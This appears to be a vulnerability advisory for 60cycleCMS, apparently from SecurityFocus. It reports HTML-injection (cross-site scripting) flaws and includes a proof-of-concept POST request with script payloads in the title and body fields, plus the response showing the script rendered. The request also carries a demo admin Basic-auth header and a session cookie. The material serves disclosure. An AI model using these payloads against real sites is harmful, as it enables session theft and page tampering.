@@ -1,0 +1,58 @@
+source: http://www.securityfocus.com/bid/38637/info
+
+60cycleCMS is prone to multiple HTML-injection vulnerabilities because it fails to properly sanitize user-supplied input.
+
+Successful exploits will allow attacker-supplied HTML and script code to run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user. Other attacks are also possible. 
+
+
+http://www.example.com/60cycleCMS/private/select.php?act=edit
+
+POST /60cyclecms/private/preview.php HTTP/1.1
+  Host: demo.opensourcecms.com
+  User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8
+  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+  Accept-Language: en-us,en;q=0.5
+  Accept-Encoding: gzip,deflate
+  Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+  Keep-Alive: 300
+  Proxy-Connection: keep-alive
+  Referer: http://www.example.com/60cyclecms/private/edit.php
+  Cookie: __utma=87180614.1562082400.1268211497.1268211497.1268211497.1; __utmb=87180614.6.10.1268211497; __utmc=87180614; __utmz=87180614.1268211497.1.1.utmcsr=php.opensourcecms.com|utmccn=(referral)|utmcmd=referral|utmcct=/scripts/details.php; PHPSESSID=f6e21193e32af41e62a0c82a839d3a1e
+  Authorization: Basic YWRtaW46ZGVtbzEyMw==
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: 122
+ 
+  title="><script>alert("XSS")</script>&body="><script>alert("XSS")</script>&time=&timezone=
+
+
+
+<html>
+   <body>
+ 
+   <h2>Post Preview:</h2>
+   <form action="" method="post">
+   <input type="button" value="Edit Post" onclick="submitForm(this)">
+   <input type="button" value="Submit Post" onclick="submitForm(this)">
+   </form>
+ 
+   <script type="text/javascript">
+     function submitForm(button)
+   {
+    if (button.value == "Edit Post")
+        button.form.action = "edit.php";
+    else
+        button.form.action = "submit.php";
+         
+    button.form.submit();
+   }
+ 
+ </script>
+     
+  <h2 class="lonelyPost"><a class="titleLink" href="#">"><script>alert("XSS")</script></a></h2><h4>Thursday, January 1, 1970 - 12:00 am</h4><p>"><script>alert("XSS")</script></p></body>
+ </html>
+
+
+
+
+
+
